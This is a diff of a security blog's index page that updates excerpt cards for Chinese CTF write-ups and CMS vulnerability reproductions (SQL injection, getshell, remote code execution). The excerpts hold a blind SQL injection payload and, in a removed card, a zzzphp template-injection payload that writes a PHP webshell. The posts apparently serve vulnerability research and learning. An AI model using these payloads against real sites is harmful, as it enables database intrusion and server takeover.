@@ -176,6 +176,195 @@
     
     <article class="col-12 col-md-12 mx-auto index-info">
       <h1 class="index-header">
+        <a href="/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/">数字经济云安全公测大赛Inject4fun题解 </a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2019/09/22/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%AC%E6%B5%8B%E5%A4%A7%E8%B5%9BInect4fun%E9%A2%98%E8%A7%A3/">
+          
+          
+            
+          
+          Inject4Funlogin.html
+
+js代码
+
+提示注入，过滤以下字符
+or、and、&amp;&amp;、||、ord、ascii、like、select、union....
+
+可以构造如下语句,注入类型布尔盲注
+1'^(length(database())=4)^'1   长度3
+
+false =&gt; 显示：wrong password  
+true=&gt; 显示：wrong u
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2019-09-22 10:28" pubdate>
+              2019-09-22
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/CTF/">CTF</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        <a href="/2019/09/17/Cmsms-2-2-9%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-%E5%A4%8D%E7%8E%B0/">Cmsms_2.2.9前台sql注入(复现)</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2019/09/17/Cmsms-2-2-9%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5-%E5%A4%8D%E7%8E%B0/">
+          
+          
+            
+          
+          漏洞原理
+没有对sql语句进行过滤
+unset操作绕过对字符串的强制类型操作
+
+漏洞分析class.CMS_Content_Block.php，第237行执行对传入的mact参数进行拆分
+$modulename=”news”、$action=”default”
+
+class.CMS_Content_Block.php第289行GetModuleParameters方法 ，解析传入的参数，注册变量，
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2019-09-17 20:20" pubdate>
+              2019-09-17
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        <a href="/2019/09/11/seacms-9-92%E5%89%8D%E5%8F%B0getshell/">seacms&amp;#x3C;&amp;#x3D;9.92前台getshell</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2019/09/11/seacms-9-92%E5%89%8D%E5%8F%B0getshell/">
+          
+          
+            
+          
+          漏洞原理mysql语句执行错误，fwrite函数写入报错数据至php文件中.
+参考链接：https://xz.aliyun.com/t/6191
+变量注册将传入的全局数组GET、POST、COOKIE循环遍历置为变量
+
+漏洞分析/comment/api/index.php第18行进入ReadData函数,将定义的全局变量$rlist经implode字符操作赋值为$x
+
+跟进Readmlst函数，会
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2019-09-11 15:34" pubdate>
+              2019-09-11
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        <a href="/2019/08/31/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8BDuomicmsv1-32-sql%E6%B3%A8%E5%85%A5/">漏洞挖掘之Duomicmsv1.32后台一处sql注入</a>
+      </h1>
+
+      <p class="index-excerpt">
+        <a href="/2019/08/31/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8BDuomicmsv1-32-sql%E6%B3%A8%E5%85%A5/">
+          
+          
+            
+          
+          漏洞原理漏洞位置：/admin/admin_video.php
+1.$this-&gt;safeCheck由于包含config.php被置为false，跳过了sql检查和过滤
+2.使用自定义$_POST变量
+漏洞分析/admin/admin_video.php文件存在sql注入
+从源码来看以下两个参数直接接收$_POST参数传递，没有经过common.php转义，可能存在注入，继续跟进
+$v_ex
+        </a>
+      </p>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2019-08-31 22:29" pubdate>
+              2019-08-31
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
         <a href="/2019/08/27/%E8%87%AD%E7%83%82%E4%BB%A3%E7%A0%81%E8%9C%95%E5%8F%98-python%E7%88%AC%E5%8F%96%E6%95%99%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%88%90%E7%BB%A9-%E5%88%9D%E7%89%88/">臭烂代码蜕变 | python爬取教务管理系统成绩(初版)</a>
       </h1>
 
@@ -205,183 +394,6 @@
             <i class="iconfont icon-tags"></i>
             
               <a href="/tags/python/">python</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        <a href="/2019/08/25/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">zzzphp1.7.0远程代码执行</a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2019/08/25/zzzphp1-7-0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
-          
-          
-            
-          
-          漏洞原因str_ireplace函数缺陷无法有效过滤危险参数
-漏洞复现payload
-&#123;if:1)file_put_contents(str_replace('*','','osword.pphphp'),str_replace('*','','&lt;?pphphp evevalal(ggetet_defined_vars()[_PPOSTOST][1]);'));//&#125;&#
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2019-08-25 15:25" pubdate>
-              2019-08-25
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        <a href="/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/">2019SUCTF Easay-php题解记录</a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2019/08/24/2019SUCTF-Easay-php%E9%A2%98%E8%A7%A3%E8%AE%B0%E5%BD%95/">
-          
-          
-            
-          
-          easy-phpPhp的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串
-Ascii码大于 0x7F 的字符都会被当作字符串
-可见字符In [35]: string.printable
-Out[35]: '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&a
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2019-08-24 16:54" pubdate>
-              2019-08-24
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/CTF/">CTF</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        <a href="/2019/07/30/Thinkphp5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%BA%8C/">Thinkphp5 远程代码执行(二)</a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2019/07/30/Thinkphp5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%BA%8C/">
-          
-          
-            
-          
-          tp5路由复习
-一. 注册和读取路由规则的关键代码在 think\App类的routeCheck方法二.路由检查下面的代码就是获取当前请求类型的路由规则$method = $request-&gt;method();// 获取当前请求类型的路由规则$rules = self::$rules[$method];三.路由检测(checkRoute方法)/Route.php第908行
-
-
-路由参数检查
-
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2019-07-30 21:29" pubdate>
-              2019-07-30
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
-            
-          </div>
-        
-      </div>
-    </article>
-  </div>
-
-  <div class="row mx-auto index-card">
-    
-    
-    <article class="col-12 col-md-12 mx-auto index-info">
-      <h1 class="index-header">
-        <a href="/2019/07/29/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Typecho反序列化漏洞</a>
-      </h1>
-
-      <p class="index-excerpt">
-        <a href="/2019/07/29/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
-          
-          
-            
-          
-          __toString调用trick1. echo($obj)/print($obj)
-2. "i am &#123;$obj&#125;" / 'test'.$obj
-3. sprintf("i am %s",$obj)
-4. if($obj == 'admin')
-
-反序列化复习摘自挖掘暗藏ThinkPHP中的反序列利用链
-1.在PHP反序列化的过程中会自动执行一些魔术方法方法名 	调用条件
-_
-        </a>
-      </p>
-
-      <div class="index-btm post-metas">
-        
-          <div class="post-meta mr-3">
-            <i class="iconfont icon-date"></i>
-            <time datetime="2019-07-29 23:02" pubdate>
-              2019-07-29
-            </time>
-          </div>
-        
-        
-        
-          <div class="post-meta">
-            <i class="iconfont icon-tags"></i>
-            
-              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
             
           </div>
         
